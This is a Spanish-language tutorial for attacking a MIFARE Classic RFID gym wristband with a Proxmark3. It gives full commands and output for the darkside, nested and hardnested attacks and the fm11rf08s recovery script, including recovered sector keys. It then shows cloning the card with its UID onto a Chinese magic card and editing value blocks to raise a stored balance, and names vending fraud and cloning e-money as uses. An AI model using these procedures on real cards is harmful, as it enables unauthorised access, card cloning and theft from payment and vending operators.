
# Ataques NFC/RFID

<figure><img src="/files/yRcykbpVO6maGdBto9rn" alt=""><figcaption></figcaption></figure>

Lanzaremos los ataques contra una pulsera de gimnasio RFID, con el objetivo de extraer las claves y conseguir clonarla en otro dispositivo como una blank card o **”Chinese Magic Card”** GEN 1A.

En este ejemplo veremos cómo:

1. Ejecutar el **ataque DarkSide y Nested** con PM3.
2. Encadenarlo con **Hardnested** para obtener todas las claves.
3. En caso de no conseguir claves utilizar Script Recovery.
4. Clonar, analizar y comparar tarjetas.

***

## <mark style="color:orange;">Lanzando los ataques</mark>

Aunque muchas tarjetas nuevas han endurecido el PRNG, el firmware del RRG sigue ofreciendo técnicas muy efectivas.

Conectamos la Proxmark3 y ejecutamos `pm3`:

```bash
hf search
```

Si aparece **PRNG: weak**… estamos de suerte.

<figure><img src="/files/iIUFuLGRFgMwhZEx4IDi" alt=""><figcaption></figcaption></figure>

### Paso 1: comprobar claves por defecto

```bash
hf mf chk
```

<figure><img src="/files/2FUAHEL86UCJ2SPF4Ohl" alt=""><figcaption></figcaption></figure>

Vemos que no hemos conseguido extraer todas las claves, por lo que empezaremos a intentar extraerlas con un ataque Darkside.

### Paso 1: Ataque Darkside

```bash
hf mf darkside
```

<figure><img src="/files/6YHjTgLnWk6cBboIfYGe" alt=""><figcaption></figcaption></figure>

Si no es vulnerable, pasamos a un ataque Nested.

### Paso 2: Ataque Nested con una clave válida

Por ejemplo, con la clave A del bloque 0:

```bash
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
```

<figure><img src="/files/gloGjttT5IGhmixVFJWH" alt=""><figcaption></figcaption></figure>

Si el ataque Nested falla, pasamos al Hardnested

### Paso 3: Ataque Hardnested

```bash
hf mf hardnested --help
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
```

Aquí se realizan **miles de autenticaciones** para construir el ataque hasta conseguir las claves.

<figure><img src="/files/aMxujscSdoho2Hl2EIrP" alt=""><figcaption></figcaption></figure>

Si el ataque hardnested falla, podemos usar algún script de pm3 como el `fm11rf08s_recovery.py`

### Paso 4: Script Recovery

```bash
script run fm11rf08s_recovery.py
```

```bash
[usb] pm3 --> script run fm11rf08s_recovery.py

[+] executing python /usr/local/bin/../share/proxmark3/pyscripts/fm11rf08s_recovery.py
[+] args ''
[=] UID: 7DC36259
[=] Getting nonces...
[=] Generating first dump file
[=] Data has been dumped to `/home/kali/hf-mf-7DC36259-dump.bin`
[=] ----Step 1:  0 minutes  1 seconds -----------
[=] Loaded mfc_default_keys.dic
[=] Running staticnested_1nt & 2x1nt when doable...
[=] Looking for common keys across sectors...
[=] Saving duplicates dicts...
[=] Computing needed time for attack...
[=] ----Step 2:  0 minutes 17 seconds -----------
[=] Still about  0 minutes  5 seconds to run...
[=] Brute-forcing keys... Press any key to interrupt
[=] Sector  0 keyA = FFFFFFFFFFFF
[=] Sector  0 keyB = FFFFFFFFFFFF
[=] Sector  1 keyA = FFFFFFFFFFFF
[=] Sector  1 keyB = FFFFFFFFFFFF
[=] Sector  2 keyB = 00008627C10A
[=] Sector  2 keyA = A0A1A2A3A4A5
[=] Sector  3 keyA = FFFFFFFFFFFF
[=] Sector  3 keyB = FFFFFFFFFFFF
[=] Sector  4 keyA = 3E65E4FB65B3
[=] Sector  4 keyB = 9438DBD47284
[=] Sector  5 keyA = 3E65E4FB65B3
[=] Sector  5 keyB = 9438DBD47284
[=] Sector  6 keyA = 3E65E4FB65B3
[=] Sector  6 keyB = 9438DBD47284
[=] Sector  7 keyA = 3E65E4FB65B3
[=] Sector  7 keyB = 9438DBD47284
[=] Sector  8 keyA = 3E65E4FB65B3
[=] Sector  8 keyB = 9438DBD47284
[=] Sector  9 keyA = 3E65E4FB65B3
[=] Sector  9 keyB = 9438DBD47284
[=] Sector 10 keyA = 3E65E4FB65B3
[=] Sector 10 keyB = 9438DBD47284
[=] Sector 11 keyA = 3E65E4FB65B3
[=] Sector 11 keyB = 9438DBD47284
[=] Sector 12 keyA = 3E65E4FB65B3
[=] Sector 12 keyB = 9438DBD47284
[=] Sector 13 keyA = 3E65E4FB65B3
[=] Sector 13 keyB = 9438DBD47284
[=] Sector 14 keyA = 3E65E4FB65B3
[=] Sector 14 keyB = 9438DBD47284
[=] Sector 15 keyA = FFFFFFFFFFFF
[=] Sector 15 keyB = FFFFFFFFFFFF
[=] Sector 32 keyB = 0000604406CE
[=] Sector 32 keyA = B95D90BEF7C3
[+] 
[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1 
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1 
[+]  002 | 011 | A0A1A2A3A4A5 | 1 | 00008627C10A | 1 
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1 
[+]  004 | 019 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  005 | 023 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  006 | 027 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  007 | 031 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  008 | 035 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  009 | 039 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  010 | 043 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  011 | 047 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  012 | 051 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  013 | 055 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  014 | 059 | 3E65E4FB65B3 | 1 | 9438DBD47284 | 1 
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1 
[+]  032 | 131 | B95D90BEF7C3 | 1 | 0000604406CE | 1 
[+] -----+-----+--------------+---+--------------+----
[+] ( 0:Failed / 1:Success )
[=] 
[+] Generating binary key file
[+] Found keys have been dumped to `/home/kali/hf-mf-7DC36259-key.bin`
[+] Generating final dump file
[+] Data has been dumped to `/home/kali/hf-mf-7DC36259-dump.bin`
[+] Removing generated dictionaries...
[=] ----Step 3:  0 minutes  1 seconds -----------
[=] ---- TOTAL:  0 minutes 13 seconds -----------

[+] finished fm11rf08s_recovery.py
```

<figure><img src="/files/Z0aefQoEMscaX22hArPG" alt=""><figcaption></figcaption></figure>

FInalmente conseguimos las claves, y nos crea 2 archivos de dumpeo:

* Claves dumpeadas: `/home/kali/hf-mf-7DC36259-key.bin`
* Data: `/home/kali/hf-mf-7DC36259-dump.bin`

***

## <mark style="color:orange;">¿Qué podemos hacer con todas las claves?</mark>

Cuando ya tenemos todas las claves A y B:

### ✔ Dumpear la tarjeta

Hacemos un dumpeo y lo restauramos en una tarjeta *writable*, incluso modificando el **bloque 0 del sector 0** para clonar el ID.

```bash
hf mf dump --mini                              -> MIFARE Mini
hf mf dump --1k                                -> MIFARE Classic 1k
hf mf dump --2k                                -> MIFARE 2k
hf mf dump --4k                                -> MIFARE 4k
hf mf dump --keys hf-mf-066C8B78-key.bin       -> MIFARE 1k with keys from specified file
```

```
hf mf dump --1k
```

<figure><img src="/files/I06RS24S8m90rTdtccgq" alt=""><figcaption></figcaption></figure>

Eso nos crea 2 archivos:

```bash
[+] Saved 1024 bytes to binary file `/home/kali/hf-mf-7DC36259-dump-001.bin`
[+] Saved to json file /home/kali/hf-mf-7DC36259-dump.json
```

### ✔ Clonar la tarjeta (incluyendo UID)

{% hint style="warning" %}
Necesitas una **“Chinese Magic Card”** (CUID / GEN 1A). Estas permiten **escribir el bloque 0**, algo que las originales NO permiten.
{% endhint %}

#### Borrar la tarjeta virgen

(En magic cards, block 0 es escribible)

```shellscript
hf mf csetuid <UID>   # opcional si solo quieres copiar UID
hf mf wrbl --blk 0 -d <16 bytes>
```

#### Restaurar el dump completo

```shellscript
hf mf restore --1k --uid 7DC36259 -k /home/kali/tarjeta_dump.bin
```

Esto copia TODOS los sectores, todas las claves, todos los accesos y datos.

👉 **Has clonado completamente la tarjeta.**

### ✔ Analizar la tarjeta (antes y después)

#### Dump inicial:

```shellscript
hf mf dump --1k -f antes.bin
```

Usas la tarjeta (pago, acceso, vending, monedero…)

#### Dump después:

```shellscript
hf mf dump --1k -f despues.bin
```

#### Comparar sector a sector:

```shellscript
hf mf diff -a antes.bin -b despues.bin
```

Esto te muestra:

* qué sectores cambian
* qué bloques cambian
* cómo cambian

Es perfecto para:

* detectar valor de saldo
* encontrar contadores
* ver flags de uso
* ver sectores de autenticación

### ✔ Manipular monederos (value blocks)

Las posibilidades son tan amplias como peligrosas:

* Recargar saldo
* Vaciarlas
* Clonar tarjetas de `e-money`
* Realizar fraude en máquinas vending
* Etc.

Muchos sistemas vending basados en Classic usan **value blocks**:

Un bloque valor tiene este formato:

```bash
[Valor][~Valor][Valor][Dirección][~Dirección]
```

Proxmark puede leerlo así:

```shellscript
hf mf valueblock read --blk 8 -k ffffffffffff
```

Modificar valores:

#### Incrementar saldo

```shellscript
hf mf valueblock inc --blk 8 -v 10 -k ffffffffffff
```

#### Decrementar saldo (gasto)

```shellscript
hf mf valueblock dec --blk 8 -v 10 -k ffffffffffff
```

#### Escribir un valor directamente

```shellscript
hf mf valueblock write --blk 8 -v 9999 -k ffffffffffff
```

{% hint style="danger" %}
**Mucho cuidado**: Modificar bloques valor sin entender la lógica del sistema puede **romper la tarjeta** o **hacer que el lector la bloquee**.
{% endhint %}

Véase *`Show me the (e-)money`* para entender por qué **esto no es un juego**.

{% embed url="<https://0xword.com/libros/161-show-me-the-e-money-hacking-a-sistemas-de-pagos-digitales-nfc-rfid-mst-y-chips-emv.html>" %}
